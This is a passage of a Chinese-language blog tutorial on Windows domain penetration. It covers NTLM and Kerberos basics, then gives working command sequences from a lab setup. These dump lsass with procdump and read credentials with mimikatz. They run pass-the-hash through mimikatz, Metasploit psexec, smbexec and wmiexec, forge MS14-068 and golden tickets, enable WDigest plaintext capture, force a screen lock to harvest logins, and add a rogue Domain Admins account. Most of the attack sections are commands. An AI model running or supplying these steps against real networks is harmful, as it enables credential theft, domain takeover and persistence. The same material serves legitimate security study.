+<h2 id="本地认证"><a href="#本地认证" class="headerlink" title="本地认证"></a>本地认证</h2><h3 id="Windows本地认证"><a href="#Windows本地认证" class="headerlink" title="Windows本地认证"></a>Windows本地认证</h3><p>在开始攻击之前，需要先了解一下 windows 的认证机制。</p>
+<p>通过操作系统的学习，已知 C:\Windows\System32\config\SAM 是储存主机账号密码的数据库文件。</p>
+<p>windows 登入的过程其实很简单，启动winlogin.exe，当用户输入账号密码后，账号密码将会发送到lsass.exe，lsass.exe将会把用户输入的明文，转换为NTLM hash与SAM文件存储的数据做比较，比较成功即登入成功。</p>
+<p>Windows Logon: 是Windows操作系统的用户登录程序，负责管理用户的登录和登出过程。它提供了用户输入账号和密码的界面，也称为登录页面或登录屏幕。</p>
+<p>lsass: 是微软windows系统的安全机制，是Windows操作系统中的一个关键进程，负责处理本地安全和登录策略。它在Windows系统启动时自动启动，并一直运行在后台。</p>
+<h3 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h3><p>当然，windows本身是不会存储明文密码的，在SAM文件中所存储的是密码的散列值，而在登入的时候，也是先将用户输入转换为散列值，才进行对比的。</p>
+<p>Hash一般存储在两个地方：</p>
+<p>1、SAM文件，存储在本机 &#x3D;&gt; 对应本地用户<br>2、NTDS.DIT文件，存储在域控上 &#x3D;&gt; 对应域用户</p>
+<h4 id="加密过程"><a href="#加密过程" class="headerlink" title="加密过程"></a>加密过程</h4><p>用户输入的明文密码 &#x3D;&gt; ⼗六进制 &#x3D;&gt; unicode &#x3D;&gt; md4 算法 &#x3D;&gt; NTLM hash。可以看见，整个加密过程还是较为简单的。</p>
+<h4 id="存储的密码格式"><a href="#存储的密码格式" class="headerlink" title="存储的密码格式"></a>存储的密码格式</h4><p>例：administrator:500:LM hash:NTLM hash</p>
+<p>可以看见，先是用户名，再是该用户的 SID，后面跟着 LM hash 和 NTLM hash</p>
+<p>如果LM Hash 是 AAD3B 开头，则是空密码或者未设置密码。</p>
+<p>LM Hash全名为 “LAN Manager Hash”，是微软为了提高Windows操作系统的安全性而采用的散列加密算法，其本质是DES加密。尽管LM Hash较容易被破解，但是为了保证系统的兼容性，Windows只是将LM Hash禁用了(从Windows Vista和Windows Server 2008版本开始，Windows操作系统默认禁用LM Hash)，LM Hash明文密码被限制在14位以内，也就是说，如果要停止使用LM Hash，将用户的密码设置为14位以上就好了。</p>
+<h4 id="lsass-exe"><a href="#lsass-exe" class="headerlink" title="lsass.exe"></a>lsass.exe</h4><p>在内网渗透进行横向移动和权限提升时，最常用的方法是通过 dump 进程 lsass.exe，从中获得明文口令或者hash。 lsass.exe（Local Security Authority SubsystemService）是一个系统进程，用于微软Windows系统的安全机制，它用于本地安全和登陆策略。在进程空间中，存有着机器的域、本地用户名和密码等重要信息。但是需要首先获得一个高的权限才能对其进行访问。</p>
+<h2 id="从-lsass-exe-获取密码"><a href="#从-lsass-exe-获取密码" class="headerlink" title="从 lsass.exe 获取密码"></a>从 lsass.exe 获取密码</h2><h3 id="Procdump"><a href="#Procdump" class="headerlink" title="Procdump"></a>Procdump</h3><p>procdump是一款命令行工具，主要用途是监视应用程序的CPU异常动向，并且对内存做一个转储。上面提到了密码的明文与密文都存储在lsass里，所以使用procdump即可将 lsass 的内存资源转储出来。以下是它的一些参数。</p>
+<p>1、相关参数<br>-ma：写入”完整”转储文件。【包括所有内存 (映像、映射和专用)；包括 (进程、线程、模块、句柄、地址空间等) 的所有元数据】<br>-accepteula：使用该命令行选项时，表示自动接受Sysinternals许可协议。<br>2、简单使用<br>使用方式非常简单，指定参数和要转储内存的文件后，再指定保存的文件名，即刻获得后缀名为 .dmp 的内存转储文件。(需要管理员权限的命令行窗口才可操作)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">procdump.exe -ma -accepteula lsass.exe passwd.dmp   #把内存当中的HASH导入到本地，并命名为passwd.dmp</span><br></pre></td></tr></table></figure>
+
+<p>正常我们是打不开passwd.dmp这个文件的，要是以记事本打开也都是乱码。这时，我们就要用到另一个小工具Mimikatz进行对passwd.dmp进行读取</p>
+<h3 id="Mimikatz"><a href="#Mimikatz" class="headerlink" title="Mimikatz"></a>Mimikatz</h3><p>1、相关参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # ::    显示帮助指令</span><br><span class="line">mimikatz # cls    清空</span><br><span class="line">mimikatz # log      记录所得到的信息</span><br><span class="line">mimikatz # hostname         查看主机名</span><br></pre></td></tr></table></figure>
+
+<p>privilege模块<br>(需要管理员权限的命令行窗口才可操作)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # privilege::debug      提升 mimikatz 权限（通过mimkatz自带的漏洞脚本对当前设备进行攻击）</span><br></pre></td></tr></table></figure>
+
+<p>sekurlsa模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">1、提取当前系统中已登录用户的密码（该方法需要先提升mimikatz权限）</span><br><span class="line">mimikatz # sekurlsa::logonpasswords     获取所有账户密码（比procdump的使用更简单）</span><br><span class="line">2、抓取用户NTLM哈希(读取内存的HASH-列出 LM 和 NTML 凭证)</span><br><span class="line">mimikatz # sekurlsa::msv</span><br><span class="line">3、加载dmp文件，并导出其中的明文密码</span><br><span class="line">mimikatz # sekurlsa::minidump passwd.dmp    切换环境</span><br><span class="line">mimikatz # sekurlsa::logonpasswords full    列出所有可用的凭据</span><br><span class="line">4、导出lsass.exe进程中所有的票据</span><br><span class="line">mimikatz # sekurlsa::tickets /export</span><br><span class="line">5、列出 kerberos 凭证</span><br><span class="line">mimikatz # sekurlsa::kerberos    获取kerberos认证信息(账户密码等)-域内</span><br><span class="line">6、pass-the-hash 哈希传递</span><br><span class="line">mimikatz # sekurlsa::pth</span><br></pre></td></tr></table></figure>
+
+<p>lsadump模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # lsadump::sam     查看sam文件内容获取用户名和NTLM hash</span><br><span class="line">mimikatz # lsadump::secrets      获取当前用户密码</span><br><span class="line">mimikatz # lsadump::dcsync /user:krbtgt     获取域控上krbtgt用户信息</span><br></pre></td></tr></table></figure>
+
+<p>kerberos模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1、列出系统中的票据</span><br><span class="line">mimikatz # kerberos::list       列出票据</span><br><span class="line">mimikatz # kerberos::tgt        列出票据        </span><br><span class="line">2、清除系统中的票据</span><br><span class="line">mimikatz # kerberos::purge      清除票据</span><br><span class="line">3、导入票据到系统中</span><br><span class="line">mimikatz # kerberos::ptc 票据路径</span><br></pre></td></tr></table></figure>
+
+<p>process模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # process::start command     启动进程</span><br><span class="line">mimikatz # process::stop command      结束进程</span><br><span class="line">mimikatz # process::list       列出进程</span><br></pre></td></tr></table></figure>
+
+<p>2、简单使用<br>Mimikatz 能够从内存中提取纯文本密码，通过参数 sekurlsa::minidump 载入刚才procdump获取的dmp文件后，就可以使用sekurlsa::logonpasswords full等命令，对密码进行读取。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::minidump ./passwd.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+
+<p>3、进阶使用</p>
+<p>利用procdump导下来的dump文件与mimikatz配合使用获取凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz # log      //记录所得到的信息</span><br><span class="line">mimikatz # sekurlsa::minidump passwd.dmp     //切换环境（挂载dmp文件）</span><br><span class="line">mimikatz # sekurlsa::logonpasswords     //列出所有可用的凭据</span><br></pre></td></tr></table></figure>
+
+<p>直接利用minikatz获取凭据（需要管理权限）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikata # log          //记录所得到的信息</span><br><span class="line">mimikatz # privilege::debug       //提权（获得mimikatz程序的特殊操作）</span><br><span class="line">mimikatz # sekurlsa::msv     //提取内存的HASH值</span><br><span class="line">mimikatz # sekurlsa::logonpasswords      //列出所有可用的凭据</span><br></pre></td></tr></table></figure>
+
+<h2 id="PTH（pass-the-hash）哈希传递"><a href="#PTH（pass-the-hash）哈希传递" class="headerlink" title="PTH（pass-the-hash）哈希传递"></a>PTH（pass-the-hash）哈希传递</h2><h3 id="简介-1"><a href="#简介-1" class="headerlink" title="简介"></a>简介</h3><p>哈希传递是一种黑客技术，攻击者可用使用用户密码的hash对远程服务器进行身份验证，扩大战果。其实就是一种 撞库 的行为。在拥有NTLM hash的情况下，我们可以非常轻易的使用mimikatz的 sekurlsa::pth 发起一次 PTH。</p>
+<p>攻击缺陷：hash 要保持静态（不修改密码）<br>适用于：域&#x2F;工作组、可用获取 hash 但是不能爆破 hash，且内网有相同密码的机器。<br>KB2871997：修复了普通用户能够 pth，但是管理员除外，系统 &gt;&#x3D; win server 2012时，无法通过 lsass 进程中抓取明文密码。<br>因 KB2871997 修复了普通用户能够 pth，所以需要使用 privilege::debug 来提升权限（在高权限终端下）。</p>
+<h3 id="基本条件"><a href="#基本条件" class="headerlink" title="基本条件"></a>基本条件</h3><p>使用mimikatz的sekurlsa::pth模块至少需要知道以下条件：</p>
+<p>pth 的对象 ：使用 net user &#x2F;domain 等命令即可查看域内用户信息<br>域名 ：使用 net view &#x2F;domain 等命令即可查看域名<br>NTLM hash ：可以通过使用procdump配合mimikatz获取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">补充：</span><br><span class="line">① reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f    #开启密码抓取</span><br><span class="line"></span><br><span class="line">②  rundll32 user32.dll,LockWorkStation   # 强制锁屏，为了让用户重新登录从而可以抓取lsass.exe文件中的密码</span><br></pre></td></tr></table></figure>
+
+<h3 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h3><p>适用于无需用户密码，只能拿到域控的NTLM Hash，而且无法解密的情况。</p>
+<h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>寻找pth的对象 &#x3D;&gt; Administrator<br>查看管理员组成员 &#x3D;&gt; 选择攻击 Administrator<br>域名 &#x3D;&gt; MAO<br>拿到管理员的ntml hash &#x3D;&gt; 570a9a65db8fba761c1008a51d4c95ab</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">其实通过mimikatz.exe，啥都满足了：</span><br><span class="line">sekurlsa::minidump ./passwd.dmp</span><br><span class="line">sekurlsa::logonpasswords full</span><br></pre></td></tr></table></figure>
+
+<h3 id="发起攻击"><a href="#发起攻击" class="headerlink" title="发起攻击"></a>发起攻击</h3><p>法一：mimikatz直接pth</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sekurlsa::pth /user:&lt;pth 的对象&gt; /domain:&lt;域名&gt; /ntlm:&lt;ntlm hash&gt; [/run:name]</span><br><span class="line"></span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::pth /user:Administrator /domain:MAO /ntlm:570a9a65db8fba761c1008a51d4c95ab /run:cmd</span><br></pre></td></tr></table></figure>
+<p>拿下域控权限。(如果参数都填写正确的情况下，还是无法攻击成功的话，尝试关闭mimikatz窗口，重新以管理员启动cmd.exe，重新提升权限，再进行攻击。run后面的命令不写也行，默认开启域控的cmd.exe)</p>
+<p>法二：msf的psexec</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">search psexec</span><br><span class="line">use exploit/windows/smb/psexec</span><br><span class="line">show option</span><br><span class="line">set rhosts 192.168.126.10</span><br><span class="line">set SMBDomain MAO</span><br><span class="line">set SMBUSER Administrator</span><br><span class="line">set SMBpass 6f08d7b306b1dad4b75e0c8d76954a50:570a9a65db8fba761c1008a51d4c95ab   # LM:NTLM</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+
+<p>法三：凭据传递脚本获取shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbexec.py</span><br><span class="line">python smbexec.py -hashes 6f08d7b306b1dad4b75e0c8d76954a50:570a9a65db8fba761c1008a51d4c95ab MAO/Administrator@192.168.126.10</span><br><span class="line"></span><br><span class="line">wmiexec.py</span><br><span class="line">python wmiexec.py -hashes 6f08d7b306b1dad4b75e0c8d76954a50:570a9a65db8fba761c1008a51d4c95ab MAO/Administrator@192.168.126.10</span><br></pre></td></tr></table></figure>
+
+<h2 id="Kerberos认证协议"><a href="#Kerberos认证协议" class="headerlink" title="Kerberos认证协议"></a>Kerberos认证协议</h2><p>Kerberos是一种第三方认证协议，通过使用对称加密技术为客户端&#x2F;服务器应用程序提供强身份验证。在希腊神话中Kerberos是守护地狱之门的一条三头神犬，而这三个头分别代表着协议的三个角色，如下图所示它们分别是:</p>
+<p>1、访问服务的Client（发送请求的一方）</p>
+<p>2、提供服务的Server（接收请求的一方）</p>
+<p>3、KDC，密钥分发中心，该中心里又包含以下两个服务：<br>AS，身份验证服务(认证服务器)【专门用来认证客户端的身份并发放客户用于访问TGS的TGT】<br>TGS，票据授权服务(票据授予服务器)【用来发放整个认证过程以及客户端访问服务端时所需的服务授予票据】</p>
+<p>DC（Domain Controller）：域控制器<br>KDC（Key Distribution Center）：密钥分发服中心<br>AS（Authentication Server）：认证服务器<br>TGS（Ticket Granting Server）：票据授权服务器<br>TGT（Ticket Granting Ticket）：票据授权票据</p>
+<p>认证概述<br>1、首先客户端向 AS 发起请求，获得TGT。<br>2、客户端使用从 AS 获得的TGT，向 TGS 发起请求，TGS 成功解密 TGT 后，生成新的票据返回给客户端。<br>4、客户端使用 TGS 返回的新票据向服务器发送请求进行授权。</p>
+<h2 id="PTC（pass-the-ccahe）缓存传递"><a href="#PTC（pass-the-ccahe）缓存传递" class="headerlink" title="PTC（pass-the-ccahe）缓存传递"></a>PTC（pass-the-ccahe）缓存传递</h2><p>如果能够拿到用户的 TGT，并将其倒入到内存，那么就可以冒充该用户获得其访问权限。</p>
+<h3 id="MS14-068漏洞"><a href="#MS14-068漏洞" class="headerlink" title="MS14-068漏洞"></a>MS14-068漏洞</h3><p>MS14-068 是密钥分发中心（KDC）服务中的 Windows 漏洞。它允许经过身份验证的用户在其 Kerberos 票据（TGT）中插入任意 PAC（表示所有用户权限的结果）。该漏洞位于kdcsvc.dll 域控制器的密钥分发中心中。用户可以通过呈现具有改变 PAC 的 kerberos TGT 来获得票据。<br>需要高权限。</p>
+<p>影响范围：<br>Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 及 Windows Server 2012 R2<br>Windows Vista、Windows 7、 Windows 8 及 Windows 8.1</p>
+<p>补丁编号与利用条件</p>
+<p>补丁编号：KB3011780</p>
+<p>利用条件：<br>获取到一台主机的权限（域内主机）<br>收集到计算机域管理员用户的账号密码、SID、域名信息<br>没打 MS14-068 补丁</p>
+<h3 id="信息收集-2"><a href="#信息收集-2" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1、域管理员用户的SID</span><br><span class="line">whoami /all  =&gt; S-1-5-21-863777703-696496247-1862912240-500</span><br><span class="line"></span><br><span class="line">2、域管理员用户的明文密码</span><br><span class="line">mimikatz.exe</span><br><span class="line">sekurlsa::minidump ./passwd.dmp</span><br><span class="line">sekurlsa::logonpasswords full    =&gt; Admin@123</span><br><span class="line"></span><br><span class="line">3、域名信息（完整域名消息）</span><br><span class="line">ipconfig /all</span><br></pre></td></tr></table></figure>
+<p>Windows对大小写不敏感，所以mao.com和MAO.COM均可</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>1、生成域控管理员密钥</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">使用现成的脚本来获取票据：</span><br><span class="line">ms14-068.exe -u &lt;用户名@域名&gt; -s &lt;SID&gt; -d &lt;ip地址&gt; -p &lt;用户密码&gt;</span><br><span class="line"></span><br><span class="line">MS14-068.exe -u Administrator@MAO.COM -s S-1-5-21-863777703-696496247-1862912240-500 -d 192.168.126.10 -p Admin@123</span><br></pre></td></tr></table></figure>
+
+<p>2、将内存中导入生成好的票据<br>然后使用 mimikatz的 kerberos::ptc 模块来载入票据。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">kerberos::ptc TGT_Administrator@MAO.COM.ccache</span><br></pre></td></tr></table></figure>
+
+<p>3、开启当前权限的管理员终端<br>使用mimikatz的 misc::cmd 模块，打开打开⼀个新窗口验证我们当前权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">misc::cmd</span><br><span class="line">dir \\192.168.126.10\c$</span><br></pre></td></tr></table></figure>
+
+<p>4、PsExec.exe获取一个交互式shell<br>用刚刚生成的管理员终端使用PsExec.exe工具获取一个交互式shell，并创建了隶属于管理员组的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PsExec.exe \\192.168.126.10 cmd</span><br><span class="line">ipconfig</span><br><span class="line">whoami</span><br><span class="line">net user carmi carmi@123 /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; carmi /add /domain</span><br><span class="line">net group &quot;Domain Admins&quot; /domain</span><br></pre></td></tr></table></figure>
+
+<h2 id="PTT（pass-the-ticket）黄金票据"><a href="#PTT（pass-the-ticket）黄金票据" class="headerlink" title="PTT（pass-the-ticket）黄金票据"></a>PTT（pass-the-ticket）黄金票据</h2><h3 id="简介-2"><a href="#简介-2" class="headerlink" title="简介"></a>简介</h3><p>KDC 的作用是生成任意用户的 TGT，那么问题来了，是什么条件能够让他生成任意用户的 TGT 呢？还得看 kerberos 认证的过程，在 windows 认证过程中，客户端将自己的信息发送给 KDC，然后 KDC 使用 krbtgt 用户密码的 NTLM hash 作为密钥进行加密，生成 TGT。</p>
+<p>一句话：TGT是KDC使用 krbtgt 用户密码的 hash 作为密钥，加上客户端自己的信息生成的。</p>
+<p>那么如果获取到了 krbtgt 的密码 hash 值，是否就可以伪造任意 TGT？答案是肯定的。但因为 krbtgt 只有域控制器上才有，所以使用黄金票据(票据传递攻击)意味着之前就拿到了域控制器的权限，所以黄金票据可以理解为⼀个后门。</p>
+<p>Krbtgt 用户在域控创建完成后自动生成。</p>
+<p>只要krbtgt用户不更改密码，就可以使用黄金票据是实现任何用户的票据信息，注入到内存中。</p>
+<p>黄金票据在使用的过程需要同域控通信。</p>
+<h3 id="基本条件-1"><a href="#基本条件-1" class="headerlink" title="基本条件"></a>基本条件</h3><p>域名称、域 SID(去掉rid)：通过 whoami &#x2F;user 获取<br>要伪造(目标)的用户名：通过 net user &#x2F;domain 等方法获取<br>krbtgt用户的hash：通过 mimikatz 等方法获取</p>
+<h3 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h3><p>mimkatz获取 krbtgt hash（只有这一步才需要在域控上操作） &#x3D;&gt; e798fdc7ba810c372ef7bffcdc8f2d13<br>由于mimkatz使用条件有点苛刻，且mimkatz软件问题，在命令行直接复制mimkatz内容可能无法成功或者直接到导致程序崩溃，那么这里可以通过生成log来解决。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">log</span><br><span class="line">privilege::debug</span><br><span class="line">lsadump::dcsync /user:krbtgt</span><br></pre></td></tr></table></figure>
+
+<p>域SID(不需要权限的域SID)： whoami &#x2F;user &#x3D;&gt; S-1-5-21-863777703-696496247-1862912240（最后的一个横线后表示用户权限。因此只需要前半部分）</p>
+<p>伪造(目标)的用户名：net user &#x2F;domain &#x3D;&gt; Administrator</p>
+<p>域名称（完整域名）：ipconfig &#x2F;all &#x3D;&gt; mao.com</p>
+<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>管理员窗口操作<br>1、清除原有票据<br>因为在生成票据时需要将原有的票据清空，所以一旦票据生成失败，主机也将无法继续访问域内信息了(脱域)。<br>使用 kerberos::purge 清空票据后，就可以使用 kerberos::golden 生成票据了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe</span><br><span class="line">privilege::debug</span><br><span class="line">kerberos::purge     清空票据</span><br></pre></td></tr></table></figure>
+
+<p>2、生成票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:&lt;要伪造的用户名&gt; /domain:&lt;完整域名&gt; /krbtgt:&lt;krbtgt 用户的 hash&gt; /sid:&lt;域sid&gt; /ticket:&lt;生成的文件名.kirbr&gt;</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:Administrator /domain:mao.com /krbtgt:e798fdc7ba810c372ef7bffcdc8f2d13 /sid:S-1-5-21-86377703-696496247-1862912240 /ticket:carmi.kirbr</span><br></pre></td></tr></table></figure>
+
+<p>3、注入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt carmi.kirbr</span><br></pre></td></tr></table></figure>
+
+<p>4、生成域控会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">misc::cmd</span><br><span class="line">whoami</span><br><span class="line">dir \\192.168.126.10\c$</span><br><span class="line">PsExec.exe \\192.168.126.10 cmd</span><br><span class="line">ipconfig</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">cheng_xing</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/27/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/">http://example.com/2025/04/27/%E5%9F%9F%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">cheng_xing's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/">域渗透</a></div><div class="post-share"><div class="social-share" data-image="/img/ltx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related  no-desc" href="/2025/04/08/pyjail%E5%8E%9F%E7%90%86/" title="pyjail原理"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">pyjail原理</div></div></div></a><a class="pagination-related  no-desc" href="/2025/04/30/%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%8D%8A%E5%86%B3%E8%B5%9B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94+%E7%8E%84%E6%9C%BA-linux%E5%90%8E%E9%97%A8%E5%BA%94%E6%80%A5/" title="长城杯半决赛-应急响应+玄机-linux后门应急"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">长城杯半决赛-应急响应+玄机-linux后门应急</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/ltx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">cheng_xing</div><div class="author-info-description">web菜鸡修炼中</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">20</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">57</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/sakuraraindrop" target="_blank" title="Github"><i class="fab fa-github" style="color: #hdhfbb;"></i></a><a class="social-icon" href="https://space.bilibili.com/504596197" target="_blank" title="Bilibili"><i class="fab fa-bilibili" style="color: #000000;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7"><span class="toc-number">1.1.</span> <span class="toc-text">用户</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E7%BB%84%E4%B8%8E%E5%B7%A5%E4%BD%9C%E7%BB%84"><span class="toc-number">1.1.1.</span> <span class="toc-text">用户组与工作组</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%9F%E4%B8%AD%E7%94%A8%E6%88%B7"><span class="toc-number">1.1.2.</span> <span class="toc-text">域中用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5"><span class="toc-number">1.1.3.</span> <span class="toc-text">组策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%85%E7%BD%91%E5%B8%B8%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">内网常用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#NetBIOS"><span class="toc-number">1.2.1.</span> <span class="toc-text">NetBIOS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LLMNR"><span 